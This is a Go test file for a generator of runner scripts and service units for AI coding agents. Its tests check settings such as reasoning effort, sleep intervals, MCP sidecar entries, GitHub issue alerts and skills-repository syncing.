func TestGenerate_CodexEmptyEffortLeavesDefault(t *testing.T) {
	cfg := baseCfg("lead", config.AgentConfig{
		Name: "Lead", Runtime: "codex", Iteration: "1m", Prompt: "work",
	})
	out := Generate(cfg, "lead")
	if strings.Contains(out, "model_reasoning_effort =") {
		t.Fatalf("empty effort should leave the Codex default unchanged:\n%s", out)
	}
}

func TestGenerate_CodexSuccessfulShortRunUsesConfiguredInterval(t *testing.T) {
	cfg := baseCfg("ops", config.AgentConfig{
		Name: "Ops", Runtime: "codex", Iteration: "3h", Prompt: "check",
	})
	out := Generate(cfg, "ops")
	if !strings.Contains(out, "if [ $EXIT_CODE -eq 0 ] || [ $EXIT_CODE -eq 143 ]") {
		t.Fatalf("successful Codex exits must use the configured iteration interval:\n%s", out)
	}
}

func TestGenerate_CodexRunnerHasInstructionGuard(t *testing.T) {
	cfg := baseCfg("lead", config.AgentConfig{
		Name:      "Lead",
		Runtime:   "codex",
		Model:     "gpt-5.4-codex",
		Iteration: "1m",
		Prompt:    "do the thing",
	})
	out := Generate(cfg, "lead")

	// codex reads AGENTS.md, not CLAUDE.local.md.
	for _, want := range []string{
		"MAX_CLAUDE_MD_BYTES=12288",
		`if [ -f "$WORKDIR/AGENTS.md" ]`,
		"SIZE > MAX_CLAUDE_MD_BYTES",
		"WARNING: AGENTS.md is ${SIZE} bytes",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("codex runner missing AGENTS.md guard: expected %q\nfull output:\n%s", want, out)
		}
	}
	if strings.Contains(out, "CLAUDE.local.md") {
		t.Errorf("codex runner should not reference CLAUDE.local.md (uses AGENTS.md)")
	}
}

func TestGenerateService_MissingUserFails(t *testing.T) {
	orig := userHomeLookup
	userHomeLookup = func(username string) (string, error) {
		return "", fmt.Errorf("user not found: %s", username)
	}
	t.Cleanup(func() { userHomeLookup = orig })

	cfg := baseCfg("lead", config.AgentConfig{
		Name: "Lead", Model: "claude-opus-4-7", Iteration: "1m", Prompt: "do the thing",
	})
	_, err := GenerateService(cfg, "lead")
	if err == nil {
		t.Fatal("expected error for missing user, got nil")
	}
}

func sidecarRunnerCfg() *config.Config {
	cfg := baseCfg("lead", config.AgentConfig{
		Name: "Lead", Model: "claude-opus-4-8", Iteration: "1m", Prompt: "go",
		Sidecars: []string{"es-ro"},
	})
	cfg.Agents["solo"] = config.AgentConfig{ // subscribes to nothing
		Name: "Solo", Model: "claude-opus-4-8", Iteration: "1m", Prompt: "go",
	}
	cfg.MCPSidecars = config.MCPSidecarsConfig{
		BasePort: 14500,
		Servers: []config.SidecarServer{{
			Name: "es-ro", Identity: "shared", Command: "/bin/x",
			Secrets: []string{"K"}, SecretsVault: "infra",
		}},
	}
	return cfg
}

func TestGenerate_SidecarHTTPEntryForSubscriber(t *testing.T) {
	cfg := sidecarRunnerCfg()
	out := Generate(cfg, "lead")
	for _, want := range []string{
		`for _name, _port in [['es-ro', 14500]]:`,
		`'type': 'http'`,
		`'url': 'http://127.0.0.1:%d/mcp' % _port`,
	} {
		if !strings.Contains(out, want) {
			t.Errorf("subscriber runner missing %q\n---\n%s", want, out)
		}
	}
}

func TestGenerate_NoSidecarEntryForNonSubscriber(t *testing.T) {
	cfg := sidecarRunnerCfg()
	out := Generate(cfg, "solo")
	if !strings.Contains(out, `for _name, _port in []:`) {
		t.Errorf("non-subscriber should get an empty sidecar list\n---\n%s", out)
	}
}

func TestSidecarServersLiteral(t *testing.T) {
	cfg := sidecarRunnerCfg()
	// Single-quoted: the literal is interpolated into the runner's double-quoted
	// `python3 -c "..."` block, so double quotes would break out of the shell
	// string and python would see a bare identifier (NameError).
	if got := sidecarServersLiteral(cfg, "lead"); got != `[['es-ro', 14500]]` {
		t.Errorf("subscriber literal = %q", got)
	}
	if got := sidecarServersLiteral(cfg, "solo"); got != `[]` {
		t.Errorf("non-subscriber literal = %q", got)
	}
}

func TestGenerate_GitHubBackendAlertCurl(t *testing.T) {
	cfg := &config.Config{
		Project: "test",
		Coordination: config.Coordination{
			Backend:    "github",
			GithubRepo: "owner/tasks",
			Channels: map[string]string{
				"alerts": "99",
			},
		},
		Agents: map[string]config.AgentConfig{
			"worker": {
				Name:      "Worker",
				Model:     "claude-opus-4-7",
				Iteration: "1m",
				Prompt:    "do the thing",
			},
		},
	}
	out := Generate(cfg, "worker")
	for _, want := range []string{
		`[ -n "$GH_TOKEN" ]`,
		`api.github.com/repos/owner/tasks/issues/99/comments`,
		`Authorization: Bearer $GH_TOKEN`,
	} {
		if !strings.Contains(out, want) {
			t.Fatalf("github runner missing %q:\n%s", want, out)
		}
	}
}

func TestGenerate_GitHubBackendSkipsChatMCP(t *testing.T) {
	cfg := &config.Config{
		Project: "test",
		Coordination: config.Coordination{
			Backend:    "github",
			GithubRepo: "owner/tasks",
			Channels: map[string]string{
				"tasks": "clem:todo",
			},
		},
		Agents: map[string]config.AgentConfig{
			"worker": {
				Name:      "Worker",
				Model:     "claude-opus-4-7",
				Iteration: "1m",
				Prompt:    "do the thing",
			},
		},
	}
	out := Generate(cfg, "worker")
	if !strings.Contains(out, `_backend = 'github'`) {
		t.Fatalf("expected coordination backend in mcp generator:\n%s", out)
	}
	if !strings.Contains(out, `if _backend != 'github' and os.environ.get('DISCORD_TOKEN'):`) {
		t.Fatalf("expected discord MCP guarded for github backend:\n%s", out)
	}
}

func TestGenerateService_GitHubWatchUnitDeps(t *testing.T) {
	mockHome(t, "/home/test-worker")
	cfg := &config.Config{
		Project: "test",
		Coordination: config.Coordination{
			Backend:    "github",
			GithubRepo: "acme/tasks",
			Channels:   map[string]string{"tasks": "clem:todo", "alerts": "1"},
		},
		Agents: map[string]config.AgentConfig{
			"worker": {
				Name:      "Worker",
				Model:     "claude-opus-4-7",
				Iteration: "1m",
				Prompt:    "do the thing",
			},
		},
	}
	out, err := GenerateService(cfg, "worker")
	if err != nil {
		t.Fatalf("GenerateService: %v", err)
	}
	want := "Wants=clem-github-watch-test-worker.service"
	if !strings.Contains(out, want) {
		t.Fatalf("expected %q in service unit:\n%s", want, out)
	}
}

func TestGenerate_SkillsSyncInjectedWhenRepoSet(t *testing.T) {
	cfg := baseCfg("worker", config.AgentConfig{
		Name:      "Athena",
		Model:     "claude-sonnet-4-6",
		Iteration: "1m",
		Prompt:    "do the thing",
	})
	cfg.SkillsRepo = "https://github.com/example/myteam-skills"
	out := Generate(cfg, "worker")

	wantSubstr := `clem sync-skills --home "$HOME" --agent-key "worker" --repo "https://github.com/example/myteam-skills"`
	if !strings.Contains(out, wantSubstr) {
		t.Errorf("runner missing sync-skills invocation; want substr:\n%s\ngot:\n%s", wantSubstr, out)
	}
}

func TestGenerate_SkillsSyncAbsentWhenRepoUnset(t *testing.T) {
	cfg := baseCfg("worker", config.AgentConfig{
		Name:      "Athena",
		Model:     "claude-sonnet-4-6",
		Iteration: "1m",
		Prompt:    "do the thing",
	})
	// SkillsRepo intentionally empty
	out := Generate(cfg, "worker")
	if strings.Contains(out, "clem sync-skills") {
		t.Errorf("runner should not invoke sync-skills when SkillsRepo unset; got:\n%s", out)
	}
}

func TestGenerate_NightSleepDefaultsToIteration(t *testing.T) {
	cfg := baseCfg("lead", config.AgentConfig{Name: "L", Iteration: "10m", Prompt: "p"})
	out := Generate(cfg, "lead")
	if !strings.Contains(out, "SLEEP_ACTIVE=600") || !strings.Contains(out, "SLEEP_NIGHT=600") {
		t.Errorf("expected both sleeps 600, got:\n%s", out)
	}
}

func TestGenerate_NightSleepFromIterationNight(t *testing.T) {
	cfg := baseCfg("lead", config.AgentConfig{Name: "L", Iteration: "10m", IterationNight: "30m", Prompt: "p"})
	out := Generate(cfg, "lead")
	if !strings.Contains(out, "SLEEP_ACTIVE=600") || !strings.Contains(out, "SLEEP_NIGHT=1800") {
		t.Errorf("expected active 600 night 1800, got:\n%s", out)
	}
}

func TestGenerate_NextEffortAndQuotaBlocks(t *testing.T) {
	cfg := baseCfg("lead", config.AgentConfig{Name: "L", Iteration: "1m", Prompt: "p"})
	out := Generate(cfg, "lead")
	for _, want := range []string{
		`NEXT_EFFORT_FILE="$HOME/.clem/next-effort"`,
		`NEXT_EFFORT_FILE="$HOME/.claude/next-effort"`,
		`export CLAUDE_CODE_EFFORT_LEVEL="$NEXT_EFFORT"`,
		"unset CLAUDE_CODE_EFFORT_LEVEL",
		`QUOTA_FILE="$HOME/.claude/quota.json"`,
		"api.anthropic.com/api/oauth/usage",
		`PROMPT="${RUNNER_WARNINGS}${PROMPT}"`,
	} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q in claude runner", want)
		}
	}
	// opencode runtime gets warnings prepend but no effort/quota machinery
	cfg = baseCfg("lead", config.AgentConfig{Name: "L", Iteration: "1m", Prompt: "p", Runtime: "opencode"})
	out = Generate(cfg, "lead")
	if strings.Contains(out, "next-effort") || strings.Contains(out, "QUOTA_FILE") {
		t.Errorf("opencode runner should not contain effort/quota blocks")
	}
	if !strings.Contains(out, `PROMPT="${RUNNER_WARNINGS}${PROMPT}"`) {
		t.Errorf("opencode runner missing warnings prepend")
	}
}

func TestGenerate_SkillsSyncFailureUsesPipestatusAndWarns(t *testing.T) {
	cfg := baseCfg("lead", config.AgentConfig{Name: "L", Iteration: "1m", Prompt: "p"})
	cfg.SkillsRepo = "https://example.com/skills"
	out := Generate(cfg, "lead")
	for _, want := range []string{
		`if [ "${PIPESTATUS[0]}" != "0" ]`,
		"Skills sync FAILED this iteration",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q in runner with skills repo", want)
		}
	}
}

// TestGenerate_BackendAssignedInsidePython is a regression test: the
// `_backend = '<backend>'` assignment must live INSIDE the python3 -c MCP-config
// script, not on the bash line above it. The earlier layout leaked it to the
// shell ("clem-runner.sh: line NN: _backend: command not found") and left the
// Python block raising NameError: name '_backend' is not defined.
func TestGenerate_BackendAssignedInsidePython(t *testing.T) {
	cases := []struct {
		name    string
		runtime string
		model   string
	}{
		{"claude-code", "", "claude-opus-4-7"},
		{"opencode", "opencode", "nemotron-3-nano:4b"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			cfg := baseCfg("lead", config.AgentConfig{
				Name:      "Lead",
				Runtime:   tc.runtime,
				Model:     tc.model,
				Iteration: "1m",
				Prompt:    "do the thing",
			})
			cfg.Coordination.Backend = "github"

			out := Generate(cfg, "lead")

			// Buggy layout: assignment on its own bash line right before python.
			if strings.Contains(out, "_backend = 'github'\npython3 -c \"") {
				t.Fatal("_backend assigned in bash immediately before python3 -c — leaks to the shell")
			}
			py := strings.Index(out, `python3 -c "`)
			assign := strings.Index(out, "_backend = 'github'")
			if py == -1 || assign == -1 {
				t.Fatalf("missing python block or _backend assignment, got:\n%s", out)
			}
			if assign < py {
				t.Errorf("_backend assigned before python3 -c (runs in bash), not inside python")
			}
		})
	}
}
